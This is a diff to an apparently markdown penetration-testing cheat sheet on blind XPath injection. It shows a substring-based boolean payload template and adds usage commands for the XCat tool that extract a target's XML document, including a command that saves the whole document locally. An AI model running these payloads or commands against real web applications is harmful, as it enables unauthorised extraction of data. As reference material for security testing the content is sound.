@@ -94,3 +94,18 @@ To access the value of the subnode in position \<pos> modify the path as follows
 <valid query> or substring(/<root>/<node1>[position()=<pos>],<idx>,1) = <char>
 ```
 
+## XCat
+
+A tool that automates the process of discovery of the XML file structure. Downloadable [here](https://github.com/orf/xcat)
+
+The tool requires to specify a string that appears in page if the injection succeeds (`--true=<str>`) or fails (`--false=<str>`) in order to distinguish successful attacks
+
+```
+xcat --method=<GET|POST> <URL> <args list like arg1=val1 arg2=val2 ...> <target param> --true=<string>
+```
+
+Store full document locally
+
+```
+xcat --method=<GET|POST> <URL> <args list like arg1=val1 arg2=val2 ...> <target param> --true=<string> run retrieve  --output <path>
+```
